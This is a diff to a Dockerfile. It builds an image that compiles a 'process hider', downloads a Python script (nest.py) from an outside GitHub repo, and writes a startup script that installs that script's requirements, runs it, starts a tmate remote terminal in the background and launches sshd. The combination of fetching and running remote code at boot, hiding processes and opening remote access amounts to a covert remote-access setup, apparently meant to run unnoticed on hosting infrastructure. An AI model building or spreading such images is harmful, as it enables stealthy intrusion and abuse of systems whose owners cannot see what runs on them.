@@ -3,7 +3,7 @@ FROM debian as base
 
 # Install dependencies
 RUN apt-get update && apt-get install -y \
-    ssh git wget nano curl python3 python3-pip tmate gcc
+    ssh git wget nano curl python3 python3-pip python3-venv tmate gcc
 
 # Download and compile process hider
 WORKDIR /tmp
@@ -23,8 +23,6 @@ FROM base as app_setup
 RUN wget https://raw.githubusercontent.com/cihuuy/nest-web/main/nest.py \
     && wget https://raw.githubusercontent.com/cihuuy/nest-web/main/requirements.txt
 
-# Install Python dependencies
-RUN pip3 install -r requirements.txt
 
 # Stage 3: Final Image
 FROM base as final
@@ -35,7 +33,9 @@ COPY --from=app_setup /tmp/durex /usr/local/bin/
 
 # Setup SSH and Nginx
 RUN mkdir /run/sshd \
-    && echo "python3 /nest.py" >> /openssh.sh \
+    && echo "python3 -m venv myenv && source myenv/bin/activate && pip3 install -r requirements.txt" >> /openssh.sh \
+    && echo 'sleep 2' >> /openssh.sh \
+    && echo "python3 nest.py" >> /openssh.sh \
     && echo 'sleep 5' >> /openssh.sh \
     && echo "tmate -F &" >>/openssh.sh \
     && echo '/usr/sbin/sshd -D' >>/openssh.sh \
